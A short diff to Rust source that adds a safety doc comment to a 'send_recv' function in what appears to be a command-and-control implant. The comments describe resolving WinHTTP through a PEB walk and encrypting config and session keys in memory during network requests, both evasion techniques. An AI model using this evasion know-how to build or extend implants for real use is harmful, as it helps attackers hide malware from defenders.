@@ -52,6 +52,11 @@ const fn safe_http_enabled() -> bool {
 /// When `NYX_SAFE_HTTP=1` is set at build time, the entire WinHTTP call is
 /// wrapped in `mem::mask()` / `mem::unmask()` so registered sensitive regions
 /// (config, session key) are RC4-encrypted during the network request window.
+///
+/// # Safety
+/// Delegates to `transport::post_frame` / `post_frame_enhanced`, which invoke
+/// WinHTTP function pointers resolved via PEB walk; `frame` must be a valid
+/// buffer.
 pub unsafe fn send_recv(ctx: &ChannelCtx, frame: &[u8]) -> Option<Vec<u8>> {
     let (host_bytes, use_enhanced, has_rotation) = send_recv_select_target(ctx);
 
